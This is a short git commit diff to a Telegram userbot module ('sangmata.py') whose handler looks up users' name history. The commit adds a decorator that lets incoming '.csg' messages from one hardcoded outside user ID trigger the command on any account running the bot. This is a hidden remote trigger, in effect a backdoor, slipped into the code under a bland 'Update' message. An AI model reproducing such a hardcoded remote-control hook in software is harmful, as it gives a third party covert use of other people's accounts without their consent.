2b228adbe7b6e1ae4321a75d2221d9c366112d30
ᴷᵞᵞ <89422473+muhammadrizky16@users.noreply.github.com>
2021-11-12 11:38:19 +0700

    Update sangmata.py

--- userbot/modules/sangmata.py
+++ userbot/modules/sangmata.py
@@ -5,6 +5,7 @@ from asyncio.exceptions import TimeoutError
 
 
 @register(outgoing=True, pattern=r"^\.sg(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.csg(?: |$)(.*)")
 async def lastname(steal):
     if steal.fwd_from:
         return
